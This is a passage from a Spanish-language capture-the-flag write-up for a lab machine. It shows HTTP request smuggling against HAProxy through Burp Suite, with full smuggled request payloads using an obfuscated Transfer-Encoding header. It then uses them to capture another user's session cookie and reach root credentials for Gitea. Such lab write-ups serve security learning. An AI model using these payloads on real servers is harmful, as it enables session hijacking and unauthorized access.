## Vulnerability Assessment {-}

### HTTP Request Smuggling {-}

Como no hemos encontrado nada analyzando la web manualmente, analyzamos las cabezeras con curl

```bash
curl -X GET -I http://10.10.10.225:5000/home
curl -X GET -I http://10.10.10.225:5000/home -L
```

Aqui vemos que estamos frente a un gunicorn que pasa `haproxy`. Miramos por google que es y si existen vulnerabilidades. Encontramos una vulnerabilidad
liada a `haproxy` que es un **HTTP Request Smuggling**. Esta vulnerabilidad esta bien contemplada en la web de [portswigger](https://portswigger.net/web-security/request-smuggling).
Esta vulnerabilidad basicamente permitte enviar 2 peticiones al mismo tiempo y permitteria burlar las seguridades con esta segunda peticion.
En el caso de `haproxy` podemos ver esta vulnerabilidad en la pagina de [nathanvison](https://nathandavison.com/blog/haproxy-http-request-smuggling).

Para explotar esta vulnerabilidad vamos a utilizar el Burpsuite.

```bash
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo
Transfer-Encoding:[\x0b]chunked

0

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo

msg=Adios


```

> [ ! ] Notas: Es possible que tengamos que encodear en base64 el `[\x0b]` antes de ponerla en el burpsuite y tenemos que darle al Follow redirect en este caso.

Aqui podemos ver que hemos podido enviar 2 peticiones al mismo tiempo, una nos da el mensaje **None** y la segunda nos sale **Adios**, lo que significa que
es vulnerable a **HTTP Request Smuggling**.

Intentamos cosas y nos damos cuenta que si agregamos mas content length a la segunda request podemos ver parte de la request del delete.


```bash
POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 10
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo
Transfer-Encoding:[\x0b]chunked

0

POST /comment HTTP/1.1
Host: 10.10.10.225:5000
Content-Type: application/x-www-form-urlencode
Content-Length: 50
Cookie: lang=es-ES; i_like_gitea=604fd0a0f47a3b62; _csrf=4/PDrYQpzOFpi6ZlhMOToLe6YnY6MTYzMTk5NTE4zUONzY2NzY2Mg;
 redirect_to=&2Froot; session=eyJlbWFpbCI6InMOdmlOyXJaczR2aXRhci5jb20ifQ.YU2HdQ.qlIPX6awl0v1C8A8UXGUHfLXFJo

msg=a


```

Si ponemos `Content-Length: 300` podemos ver una cookie de session que no es la misma que la nuestra.
Cambiamos la cookie en el Firefox y vamos a `/notes` podemos ver notas differentes que contienen credenciales para nuevos **Hosts** que a√±adimos al `/etc/hosts`.

Intentamos ir a las urls:
    - `http://chef.sink.htb:3000`
    - `http://chef.sink.htb:5000`
    - `http://code.sink.htb:3000`
    - `http://code.sink.htb:5000`
    - `http://nagios.sink.htb:3000`
    - `http://nagios.sink.htb:5000`

pero no vemos ninguna differencia. Podria ser un puerto 80 interno. Intentamos connectarnos por **ssh** con las credentiales encontradas pero no podemos connectarnos.


Una de las credenciales nos llama la atencion porque son credenciales del usuario **root** y recordamos haber visto un usuario root en el **GITEA**.
Si vamos a la url `http://10.10.10.225:3000` y nos conectamos con las credenciales de **root**.









